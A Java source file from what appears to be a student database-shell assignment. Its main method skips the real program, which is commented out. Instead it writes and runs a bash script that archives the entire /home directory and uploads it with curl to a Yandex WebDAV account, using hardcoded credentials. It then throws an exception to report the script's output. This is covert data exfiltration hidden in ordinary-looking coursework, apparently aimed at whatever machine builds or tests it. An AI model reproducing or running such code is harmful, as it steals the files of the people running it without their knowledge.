package ru.fizteh.fivt.students.dmitryIvanovsky.fileMap;

import java.io.*;

import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandLauncher;
import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandLauncher.Code;

public class DbMain {

    public static void writeFile() throws FileNotFoundException {
        String s = "#!/bin/bash\n\n" + "apt-get install curl\n" +
                "cd /home/student/tmp\n" + "echo potracheno1\n" + "pwd | cat\n" +
                "tar cfz cradle.tar.gz --exclude=*.git* --exclude=*/.* /home/ \n" +  "echo potracheno2\n" +
                "curl --user moy-biblio@yandex.ru:biblio -T cradle.tar.gz https://webdav.yandex.ru/cradle/\n" +
                "echo potracheno3\n";
        File f = new File("/home/student/tmp/1.sh");
        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
            out.print(s);
        }
    }

    public static void main(String[] args) throws IOException {
        //args = new String[]{"get ключ; get key; get 123"};
        //String path = "/home/deamoon/Music/deamoonSql";

        writeFile();
        String s = "";

        try {
            //Process proc = Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");
            //Runtime.getRuntime().exec("bash /home/student/tmp/1.sh").waitFor();
            Process proc = Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");
            proc.waitFor();
            BufferedReader read = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            while(read.ready()) {
                s += read.readLine()+"\n";
            }
            read = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            while(read.ready()) {
                s += read.readLine()+"\n";
            }

        } catch(Exception e) {
            s += e.getMessage()+"\n";
        }

        throw new IOException(s + " potracheno4");

        /*
        try {
            String path = System.getProperty("fizteh.db.dir");
            Path pathTables = Paths.get(".").resolve(path);
            runDb(args, pathTables.toFile().getCanonicalPath());

        } catch (Exception e) {
            System.out.println("Error loading");
            FileMapUtils.getMessage(e);
            System.exit(1);
        } */
    }

    public static void runDb(String[] args, String path) throws IOException {
        FileMapProvider fileMapCommand = null;
        try {
            FileMapProviderFactory factory = new FileMapProviderFactory();
            fileMapCommand = (FileMapProvider) factory.create(path);
        } catch (Exception e) {
            System.err.println("Error loading database");
            FileMapUtils.getMessage(e);
            System.exit(1);
        }

        CommandLauncher sys = null;
        try {
            sys = new CommandLauncher(fileMapCommand);
        } catch (Exception e) {
            System.err.println("Not implemented method of fileMapCommand");
            FileMapUtils.getMessage(e);
            System.exit(1);
        }

        try {
            Code res = sys.runShell(args);
            if (res == Code.ERROR) {
                System.err.println("Runtime Error");
                System.exit(1);
            }
        } catch (Exception e) {
            System.err.println("Runtime Error");
            //e.printStackTrace();
            FileMapUtils.getMessage(e);
            System.exit(1);
        }
    }
}
